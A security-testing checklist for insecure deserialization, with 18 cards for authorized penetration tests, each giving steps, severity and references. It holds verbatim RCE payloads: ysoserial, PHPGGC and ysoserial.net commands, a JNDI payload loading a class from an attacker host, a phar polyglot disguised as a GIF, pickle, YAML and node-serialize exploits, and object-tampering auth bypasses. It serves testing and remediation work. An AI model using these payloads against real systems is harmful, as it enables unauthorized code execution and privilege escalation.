# Insecure Deserialization — Checklist

Expert per-attack **test-case matrix** for Insecure Deserialization — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*18 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## DESER-001 — Enumerate deserialization sinks
**Test Category:** Recon &amp; Sinks · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Cookies/session/auth tokens, .NET __VIEWSTATE, API bodies/hidden fields, remember-me/state tokens, file uploads, MQ/cache/RMI/JMX/T3/JNDI

**Test Steps:** 1. Hunt base64/binary blobs the app deserializes: cookies, session/auth tokens, hidden fields, 'remember me'/state.<br>2. Flag .NET __VIEWSTATE (+ __VIEWSTATEGENERATOR), API bodies/params, message-queue/cache payloads.<br>3. Treat file uploads as sinks: serialized objects, phar polyglots, pickle model files (.pkl/.pt/.joblib).<br>4. Grep source/JS for deserializer calls fed a base64 blob.

**Expected Result:** An inventory of every blob/endpoint that gets deserialized.

**Payload Example:**

```
Cookie: session=rO0AB... ; __VIEWSTATE=/wEP... ; body {"@type":...} ; upload model.pkl
```

**Impact:** Missing the sink (esp. ViewState / phar upload) means missing unauth RCE.

**Tools:** Burp Suite Pro, Freddy, source grep

**References:** CWE-502; OWASP Testing Guide: Testing for Serialization (WSTG-INPV-11)

---

## DESER-002 — Fingerprint the blob's format &amp; language
**Test Category:** Recon &amp; Sinks · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each candidate blob

**Test Steps:** 1. Fingerprint: Java rO0/ACED, PHP O:/a:, .NET AAEAAAD/ViewState, Python \x80/!!python, Ruby \x04\x08/BAh, Node _$$ND_FUNC$$_, JSON @type/@class/$type.<br>2. Identify the library: ObjectInputStream/Jackson/Fastjson/BinaryFormatter/pickle/Marshal/SnakeYAML/node-serialize.<br>3. The format decides the entire exploit path.

**Expected Result:** The blob's language and (where possible) deserializer library are identified.

**Payload Example:**

```
python3 poc/deser_detect.py 'rO0ABXNy...' ; --cookie "$COOKIE"
```

**Impact:** Correct fingerprint selects the right gadget tool; guessing wastes the engagement.

**Tools:** poc/deser_detect.py, Freddy

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-003 — Tamper test — confirm the sink
**Test Category:** Confirm (safe) · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Any identified blob

**Test Steps:** 1. Flip one byte/field of the blob and resend.<br>2. A deserialization error/stack trace naming ObjectInputStream/unserialize/BinaryFormatter/pickle confirms the sink + language.<br>3. This is safe - no code exec.

**Expected Result:** A tamper produces a deserialization error/stack trace tied to a known deserializer.

**Payload Example:**

```
flip one base64 byte -> 500 'java.io.StreamCorruptedException' / 'unserialize(): Error at offset'
```

**Impact:** Confirms an active deserialization sink before any risky payload.

**Tools:** Burp Repeater

**References:** CWE-502; PortSwigger Web Security Academy: Insecure deserialization

---

## DESER-004 — Blind DNS gadget — confirm deserialization (Java URLDNS)
**Test Category:** Confirm (safe) · **Severity:** High · **CVSS:** 8.6 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L)

**Where to Test / Injection Point:** Confirmed sink, before any RCE payload

**Test Steps:** 1. Java: ysoserial URLDNS 'http://UNIQUE.$COLLAB' | base64 -w0 -&gt; drop into the cookie/param.<br>2. A DNS hit to $COLLAB confirms deserialization with NO gadget dependency and NO code exec.<br>3. Per-language equivalent callbacks for PHP/.NET/Python.

**Expected Result:** A DNS callback to your OOB host confirms the blob is deserialized (no RCE risk).

**Payload Example:**

```
java -jar ysoserial.jar URLDNS "http://UNIQUE.$COLLAB" | base64 -w0
```

**Impact:** The clean first proof: deserialization confirmed safely, ready to escalate.

**Tools:** ysoserial, interactsh, Burp Collaborator

**References:** CWE-502; PortSwigger Web Security Academy: Insecure deserialization

---

## DESER-005 — Java — ysoserial gadget chain (probe then fire)
**Test Category:** Exploit — Java · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Java ObjectInputStream sinks (rO0/ACED)

**Test Steps:** 1. GadgetProbe (Burp) to learn which gadget libraries are on the classpath - don't spray.<br>2. Fire the MATCHING chain with a benign command: ysoserial CommonsCollections5 'nslookup UNIQUE.$COLLAB' | base64 -w0.<br>3. Chains: CommonsCollections1-7, Spring1/2, Groovy1, Hibernate1, ROME, C3P0, JRMPClient.

**Expected Result:** The matching ysoserial chain yields an OOB hit / benign command execution.

**Payload Example:**

```
java -jar ysoserial.jar CommonsCollections6 'nslookup UNIQUE.$COLLAB' | base64 -w0
```

**Impact:** Unauthenticated RCE via Java deserialization - Critical.

**Tools:** ysoserial, GadgetProbe, Freddy

**References:** CWE-502; PayloadsAllTheThings/Insecure Deserialization

---

## DESER-006 — Java JSON/YAML libs -&gt; JNDI -&gt; RCE
**Test Category:** Exploit — Java · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Fastjson (@type), Jackson (default typing), SnakeYAML, XStream

**Test Steps:** 1. Stand up a JNDI/LDAP ref server: marshalsec.jndi.LDAPRefServer 'http://$ATTACKER/#Exploit' 1389.<br>2. Fastjson: {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://$ATTACKER:1389/Exploit","autoCommit":true}.<br>3. SnakeYAML: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://$ATTACKER/"]]]].

**Expected Result:** The library resolves your JNDI reference and loads/executes your class.

**Payload Example:**

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://$ATTACKER:1389/Exploit","autoCommit":true}
```

**Impact:** RCE via JSON/YAML type-handling + JNDI (Fastjson/Log4Shell family) - Critical.

**Tools:** marshalsec, ysoserial

**References:** CWE-502; CWE-917; HackTricks: Deserialization

---

## DESER-007 — PHP — PHPGGC framework POP chain
**Test Category:** Exploit — PHP · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** PHP unserialize() sinks (O:/a:)

**Test Steps:** 1. phpggc -l to list framework chains (Laravel/Symfony/WordPress/Monolog/Guzzle/Yii).<br>2. Generate: phpggc Laravel/RCE1 system 'curl http://$COLLAB/p'.<br>3. Inject the serialized string into the sink; confirm via OOB.

**Expected Result:** The POP chain executes your benign command server-side.

**Payload Example:**

```
phpggc Monolog/RCE1 system 'nslookup UNIQUE.$COLLAB'
```

**Impact:** RCE via PHP object injection - Critical.

**Tools:** PHPGGC

**References:** CWE-502; PayloadsAllTheThings/Insecure Deserialization

---

## DESER-008 — PHP — phar deserialization (no unserialize call)
**Test Category:** Exploit — PHP · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any file op (file_exists/getimagesize/fopen) reachable with a phar:// path; file upload

**Test Steps:** 1. Build a phar polyglot disguised as an image: phpggc -p phar -pj 'GIF89a' -o evil.gif Monolog/RCE1 system id.<br>2. Upload it (passes GIF89a validators).<br>3. Trigger any file op on phar://evil.gif/x -&gt; metadata is deserialized -&gt; RCE.

**Expected Result:** A file operation on the phar:// path deserializes its metadata and executes code.

**Payload Example:**

```
phpggc -p phar --fast-destruct -pj 'GIF89a' -o evil.gif Monolog/RCE1 system 'curl http://$COLLAB/phar'
```

**Impact:** RCE with NO unserialize() call in the code - a widely-missed sink. Critical.

**Tools:** PHPGGC, FileUpload kit

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-009 — PHP — object tampering / __wakeup count bypass (auth bypass)
**Test Category:** Exploit — PHP · **Severity:** High · **CVSS:** 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** unserialize() with no gadget chain available

**Test Steps:** 1. Flip a security property: O:4:"User":2:{s:7:"isAdmin";b:0;} -&gt; b:1.<br>2. __wakeup bypass (CVE-2016-7124): declare a wrong property COUNT to skip __wakeup validation.<br>3. Confirm privilege/identity change.

**Expected Result:** A tampered object flips a privilege flag or bypasses __wakeup validation.

**Payload Example:**

```
O:4:"User":2:{s:4:"name";s:5:"guest";s:7:"isAdmin";b:1;}
```

**Impact:** Auth bypass / privilege escalation with no gadget chain needed - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-502; CWE-915; PayloadsAllTheThings/Insecure Deserialization

---

## DESER-010 — .NET — ysoserial.net (BinaryFormatter/LosFormatter)
**Test Category:** Exploit — .NET · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** .NET BinaryFormatter/LosFormatter sinks (AAEAAAD/////)

**Test Steps:** 1. Generate: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'nslookup UNIQUE.$COLLAB' -o base64.<br>2. Gadgets: TypeConfuseDelegate, ObjectDataProvider, WindowsIdentity, DataSet, ActivitySurrogateSelector.<br>3. Inject into the sink; confirm OOB.

**Expected Result:** The .NET gadget executes your benign command.

**Payload Example:**

```
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "cmd /c nslookup UNIQUE.$COLLAB" -o base64
```

**Impact:** RCE via .NET deserialization - Critical.

**Tools:** ysoserial.net, Freddy

**References:** CWE-502; PayloadsAllTheThings/Insecure Deserialization

---

## DESER-011 — .NET — ViewState RCE (no MAC / leaked machineKey)
**Test Category:** Exploit — .NET · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** __VIEWSTATE hidden field

**Test Steps:** 1. No MAC (EnableViewStateMac=false): ysoserial.exe -p ViewState -g TextFormattingRunProperties -c 'cmd /c nslookup UNIQUE.$COLLAB' --path=/page.aspx --apppath=/ --generator=&lt;GEN&gt; --validationalg=SHA1.<br>2. With a leaked machineKey (via XXE/LFI of web.config): add --validationkey=&lt;HEX&gt; --validationalg=SHA1.<br>3. Unauthenticated ViewState RCE = the big one.

**Expected Result:** A crafted ViewState is deserialized and executes your command.

**Payload Example:**

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup UNIQUE.$COLLAB" --path="/page.aspx" --generator=<GEN>
```

**Impact:** Unauthenticated RCE via ViewState - Critical; chains from XXE/LFI machineKey leak.

**Tools:** ysoserial.net (ViewState), Blacklist3r

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-012 — JSON default-typing RCE (Json.NET $type)
**Test Category:** Exploit — .NET/Java JSON · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Json.NET with TypeNameHandling != None; Jackson enableDefaultTyping

**Test Steps:** 1. Json.NET: {"$type":"System.Windows.Data.ObjectDataProvider,...","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process,..."...cmd /c nslookup UNIQUE.$COLLAB}}.<br>2. Confirm the process/OOB fires.

**Expected Result:** The JSON type directive instantiates a dangerous type and runs your command.

**Payload Example:**

```
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start",...}
```

**Impact:** RCE via unsafe JSON polymorphic typing - Critical.

**Tools:** ysoserial.net, Burp

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-013 — Python — pickle / PyYAML / jsonpickle
**Test Category:** Exploit — Python · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** pickle.loads / yaml.load(unsafe) / jsonpickle sinks; uploaded model files (.pkl/.pt/.joblib/.h5)

**Test Steps:** 1. pickle __reduce__: (os.system, ('nslookup UNIQUE.$COLLAB',)) -&gt; base64.<br>2. PyYAML: !!python/object/apply:os.system ['id'].<br>3. ML model files deserialize via pickle on load - uploading/loading a model is a sink.

**Expected Result:** The pickle/YAML/model payload executes your benign command on load.

**Payload Example:**

```
!!python/object/apply:os.system ["nslookup UNIQUE.$COLLAB"]
python3 poc/pickle_poc.py --cmd 'curl http://$COLLAB/py'
```

**Impact:** RCE via Python object/model deserialization - Critical.

**Tools:** poc/pickle_poc.py

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-014 — Ruby (Marshal/YAML) &amp; Node (node-serialize)
**Test Category:** Exploit — Ruby/Node · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Ruby Marshal.load/YAML.load (\x04\x08/BAh); Node node-serialize (_$$ND_FUNC$$_)

**Test Steps:** 1. Ruby: universal stdlib gadget generator -&gt; Marshal payload; YAML variant uses !ruby/object tags.<br>2. Node: {"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl http://$COLLAB/n')}()"} -&gt; base64 into the sink.<br>3. Confirm via callback.

**Expected Result:** The Ruby/Node payload executes your benign command.

**Payload Example:**

```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup UNIQUE.$COLLAB')}()"}
```

**Impact:** RCE via Ruby/Node deserialization - Critical.

**Tools:** universal-gadget, Burp

**References:** CWE-502; PayloadsAllTheThings/Insecure Deserialization

---

## DESER-015 — Gadget-less object tampering (auth bypass / privesc)
**Test Category:** Escalate · **Severity:** High · **CVSS:** 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Any language where no public chain exists

**Test Steps:** 1. No RCE chain? Flip identity/role fields in the object (isAdmin/role/user_id) for auth bypass / privesc.<br>2. Build a custom POP chain from source when no framework chain fits.<br>3. Confirm the privilege/identity change.

**Expected Result:** A tampered object grants elevated privilege or a different identity without RCE.

**Payload Example:**

```
flip role=user -> role=admin / isAdmin true in the serialized object
```

**Impact:** Auth bypass / privesc even when no RCE gadget is available - High/Critical.

**Tools:** Burp Repeater

**References:** CWE-502; CWE-915; PortSwigger Web Security Academy: Insecure deserialization

---

## DESER-016 — Cross-bug chains to deserialization RCE
**Test Category:** Escalate — Chains · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed secondary bug + a deserialization sink

**Test Steps:** 1. XXE/LFI -&gt; read web.config/machineKey -&gt; forge ViewState -&gt; RCE.<br>2. File upload -&gt; phar polyglot -&gt; file-op trigger -&gt; RCE.<br>3. SSRF -&gt; internal RMI/JMX/T3(WebLogic)/JNDI deserialization endpoint.

**Expected Result:** A secondary bug supplies the key/file/reach needed to complete deserialization RCE.

**Payload Example:**

```
XXE leaks machineKey -> ViewState RCE ; upload phar -> getimagesize() -> RCE
```

**Impact:** Turns a 'medium' info leak into unauth RCE - maximum client impact.

**Tools:** ysoserial.net, PHPGGC, SSRFmap

**References:** CWE-502; HackTricks: Deserialization

---

## DESER-017 — False-positive filter / auto-reject
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. REJECT: 'this base64 decodes to a serialized object' (no tamper/callback/RCE); a deserialization error on tamper with no exec/callback; a signed/MAC'd blob when you lack the key; URLDNS/DNS-only hit reported AS RCE (report as deser confirmation); a safe deserializer (allow-listed types / yaml.safe_load).<br>2. REQUIRE: real OOB / sleep / id proof.<br>3. Distinguish from Log4Shell/JNDI, XXE, prototype pollution, SSTI.

**Expected Result:** Only candidates with genuine callback/exec proof survive.

**Payload Example:**

```
decoded-a-blob = NOT a finding ; MAC'd blob w/o key = not exploitable ; DNS-only = confirmation not RCE
```

**Impact:** Protects credibility; deserialization is dense with 'it's a serialized blob' false positives.

**Tools:** manual

**References:** CWE-502; PortSwigger Web Security Academy: Insecure deserialization

---

## DESER-018 — Client-facing impact &amp; SAFE-PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact in business terms: unauth RCE / privesc.<br>2. Provide the fingerprint, the URLDNS confirmation, and ONE benign-command proof (id/OOB hit) - no shells.<br>3. Set CVSS 3.1 + CWE-502. Remediation: don't deserialize untrusted data; use data-only formats (JSON without type handling); if unavoidable, integrity-protect (HMAC), allow-list types, run with least privilege.<br>4. SAFE-PoC: OOB-first, one benign command, no persistence/lateral movement, delete uploaded artifacts, tear down JNDI/LDAP/OOB servers, no prod DoS.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: fingerprint + URLDNS confirm + one benign-command proof + CVSS + CWE-502 + remediation.
```

**Impact:** Converts confirmation into a defensible Critical report at the correct severity.

**Tools:** CVSS calculator, DESERIALIZATION_REPORT_TEMPLATE.md

**References:** CWE-502; FIRST CVSS v3.1; OWASP Testing Guide: Testing for Serialization (WSTG-INPV-11)  |  TOP REFERENCES: Moritz Bechler 'Java Unmarshaller Security' (marshalsec); frohoff/ysoserial; PortSwigger Academy; PayloadsAllTheThings; HackTricks; Alvaro Munoz .NET research

---
